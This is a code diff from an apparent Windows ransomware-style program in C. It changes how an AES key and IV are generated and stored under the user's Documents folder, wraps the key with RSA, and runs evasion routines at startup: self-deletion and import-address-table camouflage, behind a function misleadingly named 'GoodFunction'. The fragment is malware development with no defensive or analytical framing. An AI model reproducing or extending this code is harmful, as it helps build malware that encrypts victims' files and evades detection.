@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <strsafe.h>
-#include"common.h"
+#include"commonEnc.h"
 #include"aes.h"
 #include"IatC.h"
 
@@ -31,15 +31,14 @@ static INT GoodFunction() {
 	}
 
 	StringCchCat(keyPath, MAX_PATH * sizeof(WCHAR), userName);
-	StringCchCat(keyPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\docs_1");
-
 	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), userName);
-	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\docs_2");
+	StringCchCat(ivPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\IV");
 
-	if (!WriteToFile(keyValue, keyPath, szkey)) {
+	if (!WriteToFile(iv, ivPath, IV_SIZE)) {
 		return -1;
 	}
-	if (!WriteToFile(iv, ivPath, IV_SIZE)) {
+
+	if (!RSAwork(keyValue, keyPath)) {
 		return -1;
 	}
 
@@ -103,16 +102,8 @@ BOOL SelfDeletion() {
 int main() {
 		SelfDeletion();
 		IatCamouflage();
-		InitializeModules();
-		InitializeSysCalls();
+		GoodFunction();
 
-		//GoodFunction();
-		uint8_t keyValue[AES_256_KEY_SIZE];
-		uint8_t iv[IV_SIZE];
-		GenerateKey(keyValue,iv);
-		RSAwork(keyValue, L"C:\\Users\\vboxuser");
-
-		//Pubkey();
 
 	getchar();
 	return 0;
